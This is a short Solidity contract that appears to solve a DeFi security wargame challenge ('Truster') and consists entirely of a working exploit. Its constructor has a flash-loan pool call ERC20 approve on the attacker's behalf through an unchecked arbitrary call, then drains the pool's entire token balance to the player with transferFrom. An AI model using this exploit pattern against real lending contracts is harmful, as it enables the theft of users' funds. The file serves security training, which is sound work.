// SPDX-License-Identifier: MIT

import "./TrusterLenderPool.sol";
import "solmate/src/tokens/ERC20.sol";

pragma solidity ^0.8.0;

contract TrusterAttacker {
    constructor(TrusterLenderPool pool, ERC20 token, address player) {
        uint256 balance = token.balanceOf(address(pool));
        pool.flashLoan(0, address(token), address(token), abi.encodeWithSelector(ERC20.approve.selector, address(this), balance));
        token.transferFrom(address(pool), player, balance);
    }
}
